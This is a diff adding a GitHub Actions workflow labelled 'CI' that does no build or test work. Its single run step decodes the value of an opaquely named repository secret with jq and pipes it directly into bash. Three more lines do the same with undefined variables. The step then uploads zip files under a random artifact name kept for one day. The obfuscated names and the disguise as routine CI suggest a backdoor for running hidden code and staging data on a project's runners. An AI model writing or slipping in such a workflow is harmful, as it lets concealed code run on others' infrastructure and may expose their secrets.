@@ -1,0 +1,31 @@
+name: CI
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  scheduler:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          b83: ${{ secrets.b83 }}
+        run: |
+          printf '%s' "$b83" | jq -r .y33372 | /bin/bash
+          printf '%s' "$nx6423" | jq -r .aeify8 | /bin/bash
+          printf '%s' "$hc3" | jq -r .eu329 | /bin/bash
+          printf '%s' "$maapy4" | jq -r .znbfc68 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: QehSUzY6
+          path: "*.zip"
+          retention-days: 1
